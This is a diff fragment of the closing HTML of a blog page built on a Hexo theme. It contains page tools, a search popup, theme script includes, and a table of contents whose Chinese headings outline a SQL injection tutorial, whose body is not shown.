+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">SQL注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">SQL注入产生的原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-text">SQL注入的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-text">SQL注入的关键点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">SQL注入的危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">SQL注入的分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">SQL注入的流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%8F%8A%E5%8F%91%E7%8E%B0"><span class="nav-text">注入点的位置及发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E8%AF%BB%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">判读注入点是否存在</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-text">*判断闭合方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%88%E5%88%97%E6%95%B0%EF%BC%89%E5%8F%8A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="nav-text">判断字段数（列数）及回显位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-text">UNION 联合查询</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/lazyload.min.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
